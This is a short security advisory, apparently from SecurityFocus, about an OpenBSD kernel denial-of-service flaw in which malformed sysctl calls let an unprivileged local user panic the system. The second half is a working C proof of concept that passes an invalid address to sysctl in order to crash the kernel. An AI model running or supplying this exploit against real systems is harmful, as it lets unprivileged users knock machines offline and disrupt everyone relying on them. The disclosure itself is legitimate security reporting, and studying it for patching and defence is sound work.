source: http://www.securityfocus.com/bid/9073/info

A denial of service vulnerability has been reported for OpenBSD, specifically when handling malformed calls to sysctl. By invoking systcl and passing a specific flag in conjunction with a negative argument may trigger a kernel panic. This could be exploited by a malicious unprivileged local user to crash a target system.

The precise technical details regarding this vulnerability are currently unknown. This BID will be updated as further information is made available. 

#include <stdio.h>
#include <sys/param.h>
#include <sys/sysctl.h>

int main ()
{
unsigned int blah[2] = { CTL_KERN, 0 }, addr = -4096 + 1;

return (sysctl (blah, 2, (void *) addr, &blah[1], 0, 0));
}